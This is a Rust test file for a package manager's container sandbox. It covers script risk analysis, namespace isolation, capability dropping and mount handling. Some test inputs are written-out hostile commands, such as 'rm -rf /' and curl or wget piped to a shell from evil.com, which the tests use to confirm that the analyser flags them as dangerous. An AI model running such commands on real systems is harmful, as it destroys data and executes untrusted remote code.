// crates/conary-core/src/container/tests.rs
use super::namespaces::namespace_map_contents;
use super::*;
use crate::capability::enforcement::{EnforcementMode, EnforcementPolicy};

#[test]
fn test_script_analysis_safe() {
    let script = "#!/bin/bash\necho 'Hello World'\nexit 0";
    let analysis = analyze_script(script);
    assert_eq!(analysis.risk, ScriptRisk::Safe);
    assert!(analysis.patterns.is_empty());
}

#[test]
fn test_script_analysis_dangerous() {
    let script = "#!/bin/bash\nrm -rf /\nexit 0";
    let analysis = analyze_script(script);
    assert!(analysis.risk >= ScriptRisk::High);
    assert!(!analysis.patterns.is_empty());
}

#[test]
fn test_script_analysis_medium() {
    let script = "#!/bin/bash\nchmod u+s /usr/bin/myapp\nexit 0";
    let analysis = analyze_script(script);
    assert!(analysis.risk >= ScriptRisk::Medium);
}

#[test]
fn test_bind_mount_creation() {
    let ro = BindMount::readonly("/usr", "/usr");
    assert!(!ro.writable);
    assert_eq!(ro.source, PathBuf::from("/usr"));

    let rw = BindMount::writable("/tmp", "/tmp");
    assert!(rw.writable);
}

#[test]
fn test_readonly_remount_failure_is_fatal_in_enforce_mode() {
    let mut config = ContainerConfig::minimal(Duration::from_secs(30));
    config.capability_policy = Some(EnforcementPolicy {
        mode: EnforcementMode::Enforce,
        filesystem: None,
        network: None,
        syscalls: None,
        syscall_contract: None,
        network_isolation: false,
    });

    let sandbox = Sandbox::new(config);
    let err = sandbox
        .handle_readonly_remount_failure(Path::new("/etc/passwd"), nix::errno::Errno::EPERM)
        .expect_err("enforce mode should fail closed on read-only remount errors");
    assert!(err.to_string().contains("read-only remount failed"));
}

#[test]
fn test_readonly_remount_failure_is_fatal_outside_enforce_mode() {
    let mut config = ContainerConfig::minimal(Duration::from_secs(30));
    config.capability_policy = Some(EnforcementPolicy {
        mode: EnforcementMode::Warn,
        filesystem: None,
        network: None,
        syscalls: None,
        syscall_contract: None,
        network_isolation: false,
    });

    let sandbox = Sandbox::new(config);
    assert!(
        sandbox
            .handle_readonly_remount_failure(Path::new("/etc/passwd"), nix::errno::Errno::EPERM)
            .is_err(),
        "optional capability policy must not weaken a declared read-only mount"
    );
}

#[test]
fn test_resolv_conf_remount_failure_falls_back_to_readonly_copy() {
    let sandbox = Sandbox::new(ContainerConfig::minimal(Duration::from_secs(30)));
    let temp_dir = TempDir::new().expect("temp dir");
    let source = temp_dir.path().join("resolv.conf.source");
    let target = temp_dir.path().join("resolv.conf.target");

    fs::write(&source, "nameserver 1.1.1.1\n").expect("write source");
    fs::write(&target, "").expect("seed target");

    let copied = match sandbox.try_fallback_readonly_copy(&source, &target) {
        Ok(copied) => copied,
        Err(err) if err.to_string().contains("EPERM: Operation not permitted") => {
            // This sandbox cannot detach even a non-mount test path, so
            // there is no meaningful fallback path to exercise here.
            return;
        }
        Err(err) => panic!("copy fallback should succeed for local test path: {err}"),
    };
    assert!(copied);
    assert_eq!(
        fs::read_to_string(&target).expect("read copied target"),
        "nameserver 1.1.1.1\n"
    );
    assert_eq!(
        fs::metadata(&target)
            .expect("target metadata")
            .permissions()
            .mode()
            & 0o777,
        0o444
    );
}

#[test]
fn test_container_config_default() {
    let config = ContainerConfig::default();
    assert!(config.isolate_pid);
    assert!(config.isolate_mount);
    assert!(config.memory_limit > 0);
}

#[test]
fn test_container_config_minimal() {
    let config = ContainerConfig::minimal(Duration::from_secs(30));
    assert!(!config.isolate_pid);
    assert!(!config.isolate_mount);
    assert_eq!(config.memory_limit, 0);
}

#[test]
fn test_regex_pipe_to_shell() {
    // curl/wget piped to a shell -- Critical patterns
    let curl_sh = analyze_script("curl http://evil.com | sh");
    assert_eq!(curl_sh.risk, ScriptRisk::Critical);

    let wget_sh = analyze_script("wget http://evil.com | bash");
    assert_eq!(wget_sh.risk, ScriptRisk::Critical);

    // Sanity: plain echo must NOT trigger the pipe-to-shell pattern
    let safe = analyze_script("echo hello");
    assert_eq!(safe.risk, ScriptRisk::Safe);

    // False-positive guard: a URL ending in "sh" with no pipe must not match
    let just_curl = analyze_script("curl https://example.com/install.sh -o /tmp/x");
    assert_ne!(just_curl.risk, ScriptRisk::Critical);
}

#[test]
fn test_container_config_pristine() {
    let config = ContainerConfig::pristine();

    // Pristine should have full isolation
    assert!(config.isolate_pid);
    assert!(config.isolate_mount);
    assert!(config.isolate_uts);
    assert!(config.isolate_ipc);

    // Pristine should have NO bind mounts (no host contamination)
    assert!(config.bind_mounts.is_empty());

    // Should be detected as pristine
    assert!(config.is_pristine());

    // Long timeout for builds
    assert!(config.timeout >= Duration::from_secs(3600));
}

#[test]
fn test_container_config_pristine_vs_default() {
    let pristine = ContainerConfig::pristine();
    let default = ContainerConfig::default();

    // Default should have host mounts, pristine should not
    assert!(!default.bind_mounts.is_empty());
    assert!(pristine.bind_mounts.is_empty());

    // Default should not be pristine
    assert!(!default.is_pristine());
    assert!(pristine.is_pristine());
}

#[test]
fn test_container_config_pristine_for_bootstrap() {
    let config = ContainerConfig::pristine_for_bootstrap(
        Path::new("/opt/stage0"),
        Path::new("/src/gcc"),
        Path::new("/build/gcc"),
        Path::new("/destdir"),
    );

    // Should have mounts for the specific paths
    assert!(!config.bind_mounts.is_empty());

    // Should still be pristine (no default system mounts)
    assert!(config.is_pristine());

    // Working directory should be the build directory
    assert_eq!(config.workdir, PathBuf::from("/build/gcc"));

    // Check for expected mounts
    let mount_sources: Vec<_> = config
        .bind_mounts
        .iter()
        .map(|m| m.source.to_string_lossy().to_string())
        .collect();
    assert!(mount_sources.contains(&"/opt/stage0".to_string()));
    assert!(mount_sources.contains(&"/src/gcc".to_string()));
    assert!(mount_sources.contains(&"/build/gcc".to_string()));
    assert!(mount_sources.contains(&"/destdir".to_string()));

    let tmp_mount = config
        .bind_mounts
        .iter()
        .find(|m| m.target == Path::new("/tmp"))
        .expect("bootstrap config should mount a private /tmp");
    assert_ne!(tmp_mount.source, PathBuf::from("/tmp"));
    assert_eq!(config.owned_temp_dirs.len(), 1);
    let outer = config.owned_temp_dirs[0].path();
    assert_ne!(tmp_mount.source, outer);
    assert_eq!(tmp_mount.source.parent(), Some(outer));
    assert_eq!(
        fs::metadata(outer).unwrap().permissions().mode() & 0o7777,
        0o700
    );
    assert_eq!(
        fs::metadata(&tmp_mount.source)
            .unwrap()
            .permissions()
            .mode()
            & 0o7777,
        0o1777
    );
}

#[test]
fn test_hermetic_for_sysroot_uses_only_configured_sysroot_for_system_paths() {
    let config = ContainerConfig::hermetic_for_sysroot(
        Path::new("/work/sysroot"),
        Path::new("/work/src/pkg"),
        Path::new("/work/build/pkg"),
        Path::new("/work/dest"),
    );

    assert!(config.is_pristine());
    assert_eq!(config.workdir, PathBuf::from("/work/build/pkg"));

    let mount_pairs: Vec<_> = config
        .bind_mounts
        .iter()
        .map(|mount| {
            (
                mount.source.to_string_lossy().to_string(),
                mount.target.to_string_lossy().to_string(),
            )
        })
        .collect();

    for host_path in [
        "/usr",
        "/usr/bin",
        "/usr/lib",
        "/usr/lib64",
        "/lib",
        "/lib64",
        "/bin",
        "/sbin",
    ] {
        assert!(
            !mount_pairs
                .iter()
                .any(|(source, target)| source == host_path && target == host_path),
            "hermetic config must not bind host {host_path}"
        );
    }

    assert!(mount_pairs.contains(&("/work/sysroot/usr/bin".to_string(), "/usr/bin".to_string())));
    assert!(mount_pairs.contains(&("/work/sysroot/bin".to_string(), "/bin".to_string())));
    assert!(mount_pairs.contains(&("/work/sysroot/lib64".to_string(), "/lib64".to_string())));
    assert!(mount_pairs.contains(&("/work/sysroot/usr/lib".to_string(), "/usr/lib".to_string())));

    let tmp_mount = config
        .bind_mounts
        .iter()
        .find(|mount| mount.target == Path::new("/tmp"))
        .expect("hermetic config should mount a private /tmp");
    assert_ne!(tmp_mount.source, PathBuf::from("/tmp"));
}

#[test]
fn test_is_pristine_detection() {
    // Start with pristine
    let mut config = ContainerConfig::pristine();
    assert!(config.is_pristine());

    // Adding toolchain mount keeps it pristine
    config.add_bind_mount(BindMount::readonly("/tools", "/tools"));
    assert!(config.is_pristine());

    // Adding /usr mount makes it not pristine
    config.add_bind_mount(BindMount::readonly("/usr", "/usr"));
    assert!(!config.is_pristine());
}

#[test]
fn test_network_isolation_default() {
    let config = ContainerConfig::default();
    // Network isolation should be ON by default
    assert!(config.isolate_network);
    // resolv.conf should NOT be in default mounts
    assert!(
        !config
            .bind_mounts
            .iter()
            .any(|m| { m.target.to_string_lossy().contains("resolv.conf") })
    );
}

#[test]
fn test_network_isolation_strict() {
    let config = ContainerConfig::strict();
    assert!(config.isolate_network);
}

#[test]
fn test_network_isolation_pristine() {
    let config = ContainerConfig::pristine();
    assert!(config.isolate_network);
}

#[test]
fn test_network_isolation_hermetic() {
    let config = ContainerConfig::hermetic();
    assert!(config.isolate_network);
    assert!(config.is_pristine());
}

#[test]
fn test_network_isolation_minimal() {
    let config = ContainerConfig::minimal(Duration::from_secs(30));
    // Minimal should have NO network isolation (no isolation at all)
    assert!(!config.isolate_network);
}

#[test]
fn test_for_untrusted_enforces_minimum_isolation_levels() {
    let config = ContainerConfig::minimal(Duration::from_secs(300)).for_untrusted();

    assert!(config.isolate_pid);
    assert!(config.isolate_uts);
    assert!(config.isolate_ipc);
    assert!(config.isolate_mount);
    assert!(config.isolate_network);
    assert_eq!(config.memory_limit, DEFAULT_MEMORY_LIMIT);
    assert_eq!(config.cpu_time_limit, DEFAULT_CPU_TIME_LIMIT);
    assert_eq!(config.file_size_limit, DEFAULT_FILE_SIZE_LIMIT);
    assert_eq!(config.nproc_limit, DEFAULT_NPROC_LIMIT);
}

#[test]
fn test_sandbox_namespace_flags_include_user_namespace() {
    let flags = CloneFlags::CLONE_NEWNS | CloneFlags::CLONE_NEWNET;
    let sandbox_flags = sandbox_namespace_flags(flags);
    assert!(sandbox_flags.contains(CloneFlags::CLONE_NEWUSER));
    assert!(sandbox_flags.contains(CloneFlags::CLONE_NEWNS));
    assert!(sandbox_flags.contains(CloneFlags::CLONE_NEWNET));
}

#[test]
fn test_root_mapping_uses_nobody() {
    assert_eq!(sandbox_host_uid(0), HOST_NOBODY_ID);
    assert_eq!(sandbox_host_gid(0), HOST_NOBODY_ID);
}

#[test]
fn test_unprivileged_mapping_uses_current_ids() {
    assert_eq!(sandbox_host_uid(1000), 1000);
    assert_eq!(sandbox_host_gid(1000), 1000);
}

#[test]
fn test_namespace_map_contents_maps_root_inside() {
    assert_eq!(namespace_map_contents(65_534), "0 65534 1\n");
}

#[test]
fn test_sandbox_reports_root_inside_without_host_write_access() {
    if !isolation_available() {
        return;
    }

    let mut config = ContainerConfig::minimal(Duration::from_secs(30));
    config.isolate_mount = true;
    config.bind_mounts = default_bind_mounts();
    let probe_dir = tempfile::tempdir().unwrap();
    let probe = probe_dir.path().join("host-owned-probe");
    let sentinel = b"host probe must remain unchanged\n";
    fs::write(&probe, sentinel).unwrap();
    let privileged = Uid::effective().is_root();
    fs::set_permissions(
        &probe,
        fs::Permissions::from_mode(if privileged { 0o644 } else { 0o444 }),
    )
    .unwrap();
    config.add_bind_mount(BindMount::writable(&probe, "/host-probe"));
    let private_output = config
        .add_private_writable_mount("/sandbox-output", 0o700)
        .unwrap();
    let workspace = tempfile::tempdir().unwrap();
    let mut build_mount = BindMount::build_workspace(workspace.path(), workspace.path());
    build_mount.target = PathBuf::from("/mapped-output");
    config.add_bind_mount(build_mount);
    std::os::unix::fs::symlink("/host-probe", workspace.path().join("host-link")).unwrap();
    let mut sandbox = Sandbox::new(config);

    let (code, stdout, stderr) = match sandbox.execute(
        "/bin/sh",
        r#"#!/bin/sh
printf 'uid=%s\n' "$(id -u)"
printf 'gid=%s\n' "$(id -g)"
printf 'groups=%s\n' "$(id -G)"
if (printf 'sandbox-write\n' >> /host-probe) 2>/dev/null; then
    echo host-write-access
else
    echo host-write-blocked
fi
printf 'sandbox-owned\n' > /sandbox-output/created
printf 'build-owned\n' > /mapped-output/created
if (printf 'through-symlink\n' >> /mapped-output/host-link) 2>/dev/null; then
    exit 93
fi
"#,
        &[],
        &[],
    ) {
        Ok(result) => result,
        Err(err)
            if err
                .to_string()
                .contains("mount --make-rprivate failed: EACCES")
                || err
                    .to_string()
                    .contains("mount --make-rprivate failed: EPERM") =>
        {
            eprintln!(
                "skipping sandbox root identity assertion on a host without mount namespace privileges"
            );
            return;
        }
        Err(err) => panic!("sandbox execution should succeed: {err}"),
    };

    if code == 127 && stdout.is_empty() && stderr.is_empty() {
        eprintln!(
            "skipping sandbox root identity assertion on a host without usable mount namespace isolation"
        );
        return;
    }

    assert_eq!(
        fs::read(&probe).unwrap(),
        sentinel,
        "sandbox modified host probe"
    );
    assert_eq!(code, 0, "stderr: {stderr}");
    assert!(
        stdout.lines().any(|line| line == "uid=0"),
        "stdout: {stdout}"
    );
    assert!(
        stdout.lines().any(|line| line == "gid=0"),
        "stdout: {stdout}"
    );
    if privileged {
        assert!(
            stdout.lines().any(|line| line == "groups=0"),
            "privileged supplementary groups survived: {stdout}"
        );
    }
    assert!(stdout.contains("host-write-blocked"), "stdout: {stdout}");
    assert_eq!(
        fs::read(private_output.join("created")).unwrap(),
        b"sandbox-owned\n",
        "mapped root must retain access to its owned writable layer"
    );
    assert_eq!(
        fs::read(workspace.path().join("created")).unwrap(),
        b"build-owned\n"
    );
    use std::os::unix::fs::MetadataExt;
    let created = fs::metadata(workspace.path().join("created")).unwrap();
    assert_eq!(created.uid(), Uid::effective().as_raw());
    assert_eq!(created.gid(), Gid::effective().as_raw());
}

#[test]
fn test_pid_namespace_init_can_reap_multiple_child_processes() {
    if !isolation_available() {
        return;
    }

    let mut config = ContainerConfig::minimal(Duration::from_secs(30));
    config.isolate_pid = true;
    config.isolate_mount = true;
    config.bind_mounts = default_bind_mounts();
    let mut sandbox = Sandbox::new(config);

    let (code, stdout, stderr) = match sandbox.execute(
        "/bin/sh",
        "id -u\nid -u\nprintf 'children-complete\\n'\n",
        &[],
        &[],
    ) {
        Ok(result) => result,
        Err(err)
            if err
                .to_string()
                .contains("mount --make-rprivate failed: EACCES")
                || err
                    .to_string()
                    .contains("mount --make-rprivate failed: EPERM") =>
        {
            eprintln!(
                "skipping PID namespace assertion on a host without mount namespace privileges"
            );
            return;
        }
        Err(err) => panic!("PID namespace execution should succeed: {err}"),
    };

    assert_eq!(code, 0, "stderr: {stderr}");
    assert_eq!(
        stdout.lines().collect::<Vec<_>>(),
        ["0", "0", "children-complete"]
    );
}

#[test]
fn test_allow_network() {
    let mut config = ContainerConfig::default();
    assert!(config.isolate_network);

    config.allow_network();
    assert!(!config.isolate_network);
    // resolv.conf should be added when network is allowed
    assert!(
        config
            .bind_mounts
            .iter()
            .any(|m| { m.target.to_string_lossy().contains("resolv.conf") })
    );
}

#[test]
fn test_deny_network() {
    let mut config = ContainerConfig::default();
    config.allow_network(); // First allow it
    assert!(!config.isolate_network);

    config.deny_network();
    assert!(config.isolate_network);
    // resolv.conf should be removed when network is denied
    assert!(
        !config
            .bind_mounts
            .iter()
            .any(|m| { m.target.to_string_lossy().contains("resolv.conf") })
    );
}

#[test]
fn test_allow_network_idempotent() {
    let mut config = ContainerConfig::default();
    config.allow_network();
    config.allow_network(); // Call twice
    // Should only have one resolv.conf mount
    let resolv_count = config
        .bind_mounts
        .iter()
        .filter(|m| m.target.to_string_lossy().contains("resolv.conf"))
        .count();
    assert_eq!(resolv_count, 1);
}

#[test]
fn test_fork_process_returns_child_that_can_exit_cleanly() {
    match fork_process().expect("fork should return an error instead of panicking") {
        ForkResult::Parent { child } => {
            let status = waitpid(child, None).expect("parent should be able to wait for child");
            assert!(matches!(status, WaitStatus::Exited(_, 0)));
        }
        ForkResult::Child => std::process::exit(0),
    }
}

#[test]
fn test_sethostname_syscall_rejects_overlong_hostnames() {
    let long_name = "a".repeat(256);
    let long_name = std::ffi::CString::new(long_name).expect("hostname");
    assert!(sethostname_syscall(&long_name, 256).is_err());
}

#[test]
fn test_chroot_syscall_rejects_missing_paths() {
    let missing = std::ffi::CString::new("/definitely/missing/conary-root").expect("path");
    assert!(chroot_syscall(&missing).is_err());
}

#[test]
fn test_chdir_syscall_rejects_missing_paths() {
    let missing = std::ffi::CString::new("/definitely/missing/conary-dir").expect("path");
    assert!(chdir_syscall(&missing).is_err());
}

#[test]
fn test_set_rlimit_syscall_rejects_invalid_resource() {
    let limit = libc::rlimit {
        rlim_cur: 1,
        rlim_max: 1,
    };
    let invalid_resource = super::RlimitResource::MAX;
    assert!(set_rlimit_syscall(invalid_resource, &limit).is_err());
}

#[test]
fn test_sandbox_cannot_restore_mount_authority() {
    const CHILD_MARKER: &str = "CONARY_TEST_SEALED_SANDBOX";
    if std::env::var_os(CHILD_MARKER).is_some() {
        assert!(fs::read_dir("/").is_ok(), "namespace root must be readable");
        assert_eq!(
            fs::metadata("/dev").unwrap().permissions().mode() & 0o7777,
            0o755
        );
        // The ABI-v3 capability header is two 32-bit words; pid 0 means self.
        let header = [0x2008_0522_u32, 0];
        let mut data = [[u32::MAX; 3]; 2];
        assert_eq!(
            unsafe { libc::syscall(libc::SYS_capget, &header, &mut data) },
            0
        );
        assert_eq!(
            data, [[0; 3]; 2],
            "payload must have no process capabilities"
        );
        for capability in 0..64 {
            let value = unsafe { libc::prctl(libc::PR_CAPBSET_READ, capability, 0, 0, 0) };
            if value < 0 && std::io::Error::last_os_error().raw_os_error() == Some(libc::EINVAL) {
                break;
            }
            assert_eq!(
                value, 0,
                "capability {capability} survived in the bounding set"
            );
        }
        assert_eq!(
            unsafe { libc::prctl(libc::PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) },
            1
        );
        assert_eq!(fs::read("/sealed/probe").unwrap(), b"sealed\n");
        let error = fs::write("/sealed/probe", b"overwrite\n").unwrap_err();
        assert_eq!(error.raw_os_error(), Some(libc::EROFS));
        assert_eq!(
            unsafe {
                libc::mount(
                    std::ptr::null(),
                    c"/sealed".as_ptr(),
                    std::ptr::null(),
                    libc::MS_REMOUNT | libc::MS_BIND,
                    std::ptr::null(),
                )
            },
            -1
        );
        assert_eq!(
            std::io::Error::last_os_error().raw_os_error(),
            Some(libc::EPERM)
        );
        return;
    }
    if !Uid::effective().is_root() {
        return; // The owning privileged proof runs this exact test under sudo.
    }
    let workspace = tempfile::tempdir().unwrap();
    fs::write(workspace.path().join("probe"), b"sealed\n").unwrap();
    fs::set_permissions(
        workspace.path().join("probe"),
        fs::Permissions::from_mode(0o600),
    )
    .unwrap();
    let mut mapped = BindMount::build_workspace(workspace.path(), workspace.path());
    mapped.target = PathBuf::from("/sealed");
    mapped.writable = false;
    let mut config = ContainerConfig {
        memory_limit: 0,
        ..ContainerConfig::default()
    };
    config.add_bind_mount(mapped);
    config.add_bind_mount(BindMount::readonly(
        std::env::current_exe().unwrap(),
        "/test-program",
    ));
    let (code, stdout, stderr) = Sandbox::new(config)
        .execute_command(
            "/test-program",
            &[
                "--exact".into(),
                "container::tests::test_sandbox_cannot_restore_mount_authority".into(),
                "--nocapture".into(),
            ],
            &[(CHILD_MARKER, "1")],
        )
        .unwrap();
    assert_eq!(code, 0, "child stdout: {stdout}\nchild stderr: {stderr}");
    assert_eq!(
        fs::read(workspace.path().join("probe")).unwrap(),
        b"sealed\n"
    );
}

#[test]
fn test_nested_build_mounts_do_not_propagate_to_caller() {
    const CHILD_MARKER: &str = "CONARY_TEST_SHARED_BUILD_MOUNTS";
    if !Uid::effective().is_root() {
        return;
    }
    if std::env::var_os(CHILD_MARKER).is_none() {
        let result = std::process::Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "container::tests::test_nested_build_mounts_do_not_propagate_to_caller",
                "--nocapture",
            ])
            .env(CHILD_MARKER, "1")
            .output()
            .unwrap();
        assert!(
            result.status.success(),
            "{}",
            String::from_utf8_lossy(&result.stderr)
        );
        return;
    }

    // Create a shared caller workspace in a disposable mount namespace. This
    // exercises propagation without letting a broken candidate change the host.
    nix::sched::unshare(nix::sched::CloneFlags::CLONE_NEWNS).unwrap();
    nix::mount::mount::<str, str, str, str>(
        None,
        "/",
        None,
        nix::mount::MsFlags::MS_PRIVATE | nix::mount::MsFlags::MS_REC,
        None,
    )
    .unwrap();
    let workspace = tempfile::tempdir().unwrap();
    let destination = workspace.path().join("dest");
    fs::create_dir(&destination).unwrap();
    nix::mount::mount::<Path, Path, str, str>(
        Some(workspace.path()),
        workspace.path(),
        None,
        nix::mount::MsFlags::MS_BIND,
        None,
    )
    .unwrap();
    nix::mount::mount::<str, Path, str, str>(
        None,
        workspace.path(),
        None,
        nix::mount::MsFlags::MS_SHARED,
        None,
    )
    .unwrap();
    let before = fs::read_to_string("/proc/self/mountinfo").unwrap();
    let mut config = ContainerConfig::minimal(Duration::from_secs(30));
    config.isolate_mount = true;
    config.bind_mounts = default_bind_mounts();
    config.add_bind_mount(BindMount::build_workspace(workspace.path(), "/build"));
    config.add_bind_mount(BindMount::build_workspace(&destination, "/build/dest"));
    let mut sandbox = Sandbox::new(config);
    for _ in 0..2 {
        let (code, _, stderr) = sandbox
            .execute("/bin/sh", "printf phase >> /build/dest/output", &[], &[])
            .unwrap();
        assert_eq!(code, 0, "{stderr}");
        assert_eq!(
            fs::read_to_string("/proc/self/mountinfo").unwrap(),
            before,
            "nested mounts propagated into the caller namespace"
        );
    }
    assert_eq!(fs::read(destination.join("output")).unwrap(), b"phasephase");
    nix::mount::umount(workspace.path()).unwrap();
}

#[test]
fn test_private_sandbox_directories_under_each_umask() {
    const CHILD_MARKER: &str = "CONARY_TEST_PRIVATE_SANDBOX_UMASK";
    if let Ok(mask) = std::env::var(CHILD_MARKER) {
        let mask = u32::from_str_radix(&mask, 8).unwrap();
        // This test process runs only this exact case; do not change the
        // process-wide umask in the parent test runner.
        unsafe { libc::umask(mask) };
        let root = create_private_sandbox_dir().unwrap();
        assert_eq!(
            fs::metadata(root.path()).unwrap().permissions().mode() & 0o7777,
            0o700
        );
        let mut config = ContainerConfig::default();
        let inner = config
            .add_private_writable_mount("/scratch", 0o1777)
            .unwrap();
        assert_eq!(
            fs::metadata(inner.parent().unwrap())
                .unwrap()
                .permissions()
                .mode()
                & 0o7777,
            0o700
        );
        assert_eq!(
            fs::metadata(inner).unwrap().permissions().mode() & 0o7777,
            0o1777
        );
        return;
    }
    for mask in ["0000", "0022", "0077"] {
        let output = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "container::tests::test_private_sandbox_directories_under_each_umask",
                "--test-threads=1",
            ])
            .env(CHILD_MARKER, mask)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "umask {mask}: stdout={} stderr={}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
    }
}
